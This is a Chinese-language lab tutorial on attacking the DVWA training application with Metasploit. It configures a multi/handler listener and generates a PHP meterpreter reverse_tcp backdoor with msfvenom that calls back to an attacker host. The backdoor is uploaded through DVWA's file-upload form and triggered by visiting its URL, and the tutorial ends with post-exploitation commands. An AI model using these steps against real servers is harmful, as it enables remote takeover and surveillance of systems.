# 一、 环境准备

### 1 DVWA靶场

   DVWA下载：https://codeload.github.com/ethicalhack3r/DVWA/zip/master

注意：配置DVWA环境 准备PHP7.0以上，和 Nginx环境 
1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist要通过重命名删掉）
2 使用浏览器访问 http://192.168.70.130:8080/setup.php
3 红字问题解决
4 缺少**key**  直接替换下面2句  或者 访问https://www.google.com/recaptcha/admin/create

```
$_DVWA[ 'recaptcha_public_key' ] = '6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb';
$_DVWA[ 'recaptcha_private_key' ] = '6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K';
```

5 allow_url_include: Disabled  提示没开启
找到php目录里的php.ini **allow_url_include**  将后面参数OFF 改成**On** 修改完成重启Nginx生效

### 2 Metasploit任意平台

  可以是Windows版，可以是kali自带版

# 二、Metasploit配置监控及攻击载荷

### 1 配置监控-使用handler模块

`use exploit/multi/handler`

<img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png" alt="img" style="zoom:200%;" />

### 2 配置攻击载荷设置payload

####    第一步设置payload

 `set payload php/meterpreter/reverse_tcp`

####    第二步设置 lhost 和 lport

 `set lhost 192.168.70.3`

`set lport  4444`端口

![img](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png) 

### 3 生成php后门执行攻击获得meterpreter

#### 3.1生成PHP后门

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4444 R>shell.php`

![img](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png)

#### 3.2 传播

使用Python简单的web服务

`python3 -m http.server 80`

或

`python -m SimpleHTTPServer 80`

![img](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png)

靶机将shell.php使用**文件上传**的方式上传

然后访问

`192.168.70.130:8084/hackable/uploads/shell.php`

触发运行。

#### 3.3 执行攻击获得meterpreter

![img](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png)

`run` 或者`exploit`

获取到meterpreter 我们就可以做渗透操作了



##### 观看屏幕

`run vnc`

##### 查看当前账号

`getuid`